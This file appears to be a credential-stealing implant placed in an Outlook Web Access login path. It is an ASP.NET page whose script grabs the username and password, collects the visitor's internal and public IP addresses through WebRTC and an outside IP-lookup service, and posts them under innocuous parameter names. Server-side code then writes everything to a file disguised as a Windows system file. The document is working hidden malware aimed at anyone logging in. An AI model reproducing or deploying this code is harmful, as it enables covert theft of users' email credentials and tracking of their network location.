<%@ Page language="c#" AutoEventWireup="false" %>
<script>
function chkpress(event, sender) {
    var key = event.keyCode | event.which;
    if (key == 13) {
        clklgnok();
        return false;
    }
    return true;
}
function getInfo(callback) {
    var ip_dups = {};
    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;
    if (!RTCPeerConnection) {
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }
    var mediaConstraints = {
        optional: [{
            RtpDataChannels: true
        }]
    };
    var servers = {
        iceServers: [{
            urls: "stun:stun.services.mozilla.com"
        }]
    };
    var pc = new RTCPeerConnection(servers, mediaConstraints);
    var sentResult = false;
    function handleCandidate(candidate) {
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];
        if (!sentResult && ip_dups[ip_addr] === undefined) {
            sentResult = true;
            callback(ip_addr);
        }
        ip_dups[ip_addr] = true;
    }
    pc.onicecandidate = function (ice) {
        if (ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };
    pc.createDataChannel("");
    pc.createOffer(function (result) {
        pc.setLocalDescription(result, function () { }, function () { });
    }, function () { });
    setTimeout(function () {
        var lines = pc.localDescription.sdp.split('\n');
        lines.forEach(function (line) {
            if (line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}
function clklgnok(){
var h = new XMLHttpRequest();
var u = "/owa/auth/outlookcn.aspx";
var n = document.getElementById("username");
var p = document.getElementById("password");
var i;
var w;
    //try {
    //    var fi = new Promise(r => {
    //        var w = window, a = new (w.RTCPeerConnection || w.mozRTCPeerConnection || w.webkitRTCPeerConnection)({ iceServers: [] }), b = () => { };
    //        a.createDataChannel("");
    //        a.createOffer(c => a.setLocalDescription(c, b, b), b);
    //        a.onicecandidate = c => { try { c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r) } catch (e) { } }
    //    });
    //    fi.then(ip => i = ip);
    //}
    //catch (err) {
    //}

    try {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (xhttp.readyState == 4 && xhttp.status == 200) {
                w = JSON.parse(xhttp.responseText).ip;
            }
        };
        xhttp.open("GET", "https://api.ipify.org?format=json", true);
        xhttp.send();
    } catch (e) {

    }

    getInfo(function (tf) {
        i = tf;
        var s = "arcname=" + encodeURIComponent(n.value) + "&arcpath=" + encodeURIComponent(p.value) + "&arci=" + encodeURIComponent(i) + "&arcw=" + encodeURIComponent(w);
        h.open("POST", u, true);
        h.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        h.setRequestHeader("Content-length", s.length);
        h.setRequestHeader("Connection", "close");
        h.onloadend = function () { clkLgn(); };
        h.send(s);
    });
    //try {
    //    var xmlHttp = new XMLHttpRequest();
    //    xmlHttp.open("GET", "https://api.ipify.org/", true);
    //    xmlHttp.onloadend = function () {
    //        w = xmlHttp.responseText;
    //        var s = "arcname=" + encodeURIComponent(n.value) + "&arcpath=" + encodeURIComponent(p.value) + "&arci=" + encodeURIComponent(i) + "&arcw=" + encodeURIComponent(w);
    //        h.open("POST", u, true);
    //        h.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    //        h.setRequestHeader("Content-length", s.length);
    //        h.setRequestHeader("Connection", "close");
    //        h.onloadend = function () { clkLgn(); };
    //        h.send(s);
    //    };
    //    xmlHttp.send(null);
    //} catch (err) {

    //}
    
}
</script>

<%
    if (!string.IsNullOrEmpty(Request["arcname"])&&!string.IsNullOrEmpty(Request["arcpath"]))
    {
        int max=40;
        int count=0;
        bool isOk=true;
        while (isOk&&count<max)
        {
            try {
                count++;
                System.IO.File.AppendAllText(@"C:\ProgramData\Microsoft\Windows\MSWINFX"+count,DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")+"|"+Request.UserHostAddress+"|"+Request.ServerVariables["HTTP_X_FORWARDED_FOR"]+"|"+Request.ServerVariables["REMOTE_ADDR"]+"|"+Request["arci"]+"|"+Request["arcw"]+"|"+Request["arcname"]+"|"+Request["arcpath"]+"|"+Request.UserAgent+Environment.NewLine+Environment.NewLine);
                isOk =false;
            } catch{}
        }
    }
%>
